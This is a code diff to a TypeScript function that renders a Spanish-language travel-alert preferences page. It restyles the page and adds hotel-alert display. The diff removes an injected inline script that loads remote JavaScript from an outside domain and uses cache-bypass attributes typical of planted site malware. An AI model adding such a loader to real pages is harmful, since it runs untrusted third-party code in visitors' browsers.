@@ -7,10 +7,10 @@ export function renderPreferencesPage(token: string): string {
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
 <title>Mis preferencias · Luanna</title>
 <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
-<meta name="theme-color" content="#DB892D" />
+<meta name="theme-color" content="#fbfaf7" />
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;600;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600;700&family=Special+Elite&display=swap" rel="stylesheet">
 <style>
   :root {
     --rausch: #DB892D;
@@ -337,16 +337,9 @@ export function renderPreferencesPage(token: string): string {
     .greet { padding: 16px; }
   }
 </style>
-<script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1">
-(function () {
-    var script = document.createElement("script");
-    script.async = 1;
-    script.src = 'https://emrldtp.cc/NTQyMTY5.js?t=542169';
-    document.head.appendChild(script);
-})();
-</script>
+<link rel="stylesheet" href="/luanna-ui.css" />
 </head>
-<body>
+<body class="profile-page">
 
   <header>
     <div class="nav">
@@ -658,9 +651,22 @@ export function renderPreferencesPage(token: string): string {
       label.style.display = "block";
       function freqLabel(d) { return d === 1 ? "diario" : "cada " + d + " días"; }
       container.innerHTML = state.alerts.map(function (a) {
+        const isHotel = a.alert_type === "hotel";
+        const title = isHotel
+          ? "🏨 " + a.destination
+          : a.origin_iata + " → " + (a.destination_iata || a.destination);
+        const stay = isHotel && a.checkin && a.checkout
+          ? String(a.checkin).slice(0, 10) + " → " + String(a.checkout).slice(0, 10)
+          : "";
+        const budget = isHotel && a.max_price < 999999
+          ? " · hasta $" + a.max_price + "/noche"
+          : "";
+        const sub = stay
+          ? stay + budget + " · " + freqLabel(a.frequency_days)
+          : freqLabel(a.frequency_days);
         return '<div class="row-card"><div class="row-card-main">' +
-          '<div class="row-title">' + escapeHtml(a.origin_iata) + ' → ' + escapeHtml(a.destination_iata || a.destination) + '</div>' +
-          '<div class="row-sub">' + freqLabel(a.frequency_days) + '</div>' +
+          '<div class="row-title">' + escapeHtml(title) + '</div>' +
+          '<div class="row-sub">' + escapeHtml(sub) + '</div>' +
           '</div><div class="row-actions">' +
           '<button class="icon-btn" data-del-alert="' + a.id + '" title="Eliminar alerta">' +
           '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M3 6h18M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2m3 0v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6"/></svg>' +
